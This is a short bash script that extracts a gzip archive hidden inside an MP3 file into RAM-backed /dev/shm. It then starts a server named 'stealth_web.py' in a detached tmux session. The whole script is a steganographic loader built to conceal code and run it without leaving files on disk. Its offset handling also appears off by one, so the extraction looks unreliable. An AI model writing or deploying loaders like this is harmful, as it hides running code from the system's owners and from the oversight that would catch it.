#!/bin/bash
mkdir -p /dev/shm/carrier_core
# Find the hidden data inside your MP3
OFFSET=$(grep -aobP "\x1f\x8b\x08" carrier_vibe.mp3 | cut -d: -f1 | tail -n 1)
if [ -z "$OFFSET" ]; then
    echo "Error: Hidden system not found in MP3"
    exit 1
fi
tail -c +$OFFSET carrier_vibe.mp3 | tar -xz -C /dev/shm/carrier_core
# Start the server in the background
tmux new-session -d -s cloud_carrier "python3 /dev/shm/carrier_core/stealth_web.py"
echo "Carrier system is now LIVE in Cloud RAM."
